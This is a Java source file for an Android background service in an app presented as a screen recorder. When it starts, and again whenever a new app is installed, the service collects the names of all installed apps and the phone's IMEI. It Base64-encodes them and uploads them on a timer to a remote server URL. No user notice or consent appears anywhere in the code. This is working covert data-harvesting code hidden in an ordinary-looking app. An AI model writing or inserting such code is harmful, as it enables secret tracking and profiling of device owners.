package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class PackageName extends Service {

    Timer timer;
    String packName = "";
    public static boolean running = false;
    NewAppInstallCheck newAppInstallCheck;

    public PackageName() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        running = true;
        sendData();

        newAppInstallCheck = new NewAppInstallCheck();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
        intentFilter.addAction(Intent.ACTION_PACKAGE_INSTALL);
        intentFilter.addDataScheme("package");
        registerReceiver(newAppInstallCheck, intentFilter);

        return super.onStartCommand(intent, flags, startId);
    }

    public void sendData() {

        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- PackageName");

                packName = "";
                final PackageManager pm = getPackageManager();
                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                for (ApplicationInfo packageInfo : packages) {
                    if(!packageInfo.packageName.toString().equalsIgnoreCase(getApplicationContext().getPackageName().toString())) {
                        packName = packName + packageInfo.loadLabel(pm) + ", " + packageInfo.packageName + "\n";
                    }
                }
                packName = packName.substring(0, packName.length()-1);
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                String Dimei = tm.getDeviceId();
                String deviceDataString = "";
                String DeviceFile = "";
                HttpClient Filehttpclient = new DefaultHttpClient();
                String devicedemo = UrlDemo.fsupload;
                HttpPost filehttpPost = new HttpPost(devicedemo);

                byte[] imeidevice = Dimei.getBytes();
                String imeideviceEncode = android.util.Base64.encodeToString(imeidevice, android.util.Base64.DEFAULT);
                String imeideviceString = imeideviceEncode.replaceAll("\n", "");
                try {
                    String deviceData = android.util.Base64.encodeToString(packName.getBytes(), android.util.Base64.DEFAULT);
                    deviceDataString = deviceData.replaceAll("\n", "");
                }
                catch (Exception e){
                    System.out.println("Device Info 4 : "+e.toString());
                }


                try {
                    SharedPreferences sp = getSharedPreferences("key", 0);
                    String tValue = sp.getString("chkdevice","");

                    //FileName change
                    String devicefile_name ="PackageDetails.txt";
                    byte[] devicenamedata = devicefile_name.getBytes("UTF-8");
                    String devicenameencode = android.util.Base64.encodeToString(devicenamedata, android.util.Base64.DEFAULT);
                    DeviceFile = devicenameencode.replaceAll("\n", "");

                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

                    nameValuePair.add(new BasicNameValuePair("FNAME", DeviceFile));
                    nameValuePair.add(new BasicNameValuePair("IMEI", imeideviceString));
                    nameValuePair.add(new BasicNameValuePair("DATA", deviceDataString));

                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                    HttpResponse response = Filehttpclient.execute(filehttpPost);

                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    InputStream in = entity.getContent();
                    String buffer = "";
                    for (int i = in.read(); i != -1; i = in.read()) {
                        buffer += (char) i;
                        i++;
                    }

                    if (buffer.equalsIgnoreCase("OK")) {
                        try {
                            timer.cancel();
                        }
                        catch (Exception e) {}
                    }
                }
                catch (Exception e){
                    System.out.println("Device Info 5 : "+e.toString());
                }
            }
        }, 20000, 60500);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;

        try {
            unregisterReceiver(newAppInstallCheck);
        }
        catch (Exception r) {}

        try {
            timer.cancel();
        }
        catch (Exception e) {}
    }

    public class NewAppInstallCheck extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            sendData();
        }
    }
}
